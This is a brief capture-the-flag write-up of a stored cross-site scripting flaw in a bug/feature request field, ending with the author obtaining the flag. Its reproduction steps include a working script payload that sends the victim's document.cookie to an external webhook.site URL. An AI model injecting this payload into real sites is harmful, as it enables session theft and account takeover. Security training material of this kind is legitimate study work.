# Challenge `My Favourite Cookies` Writeup

- Vulnerability: Cross-Site Scripting (XSS)
  - Exploits a lack of input validation and sanitization, allowing the injection of malicious scripts into the website.
- Where: bug/feature request field
  - The vulnerability is present in the bug/feature request field, which lacks proper input validation.
- Impact: Stealing User Cookies
  - Exploiting this vulnerability allows an attacker to inject a malicious script that captures and sends the admin's cookies to an external site controlled by the attacker.
- NOTE: The injected script in the POC sends the victim's cookies to a webhook site for demonstration purposes.

## Steps to Reproduce

1. Navigate to the site page.
2. Edit the bug/feature request field.
3. Input the following script into the description field:

   <script>document.write('<img src="https://webhook.site/3a9f1629-aa07-4da4-b8b1-890c4834ceaf?c='+document.cookie+'" />');</script>
Now i have the flag
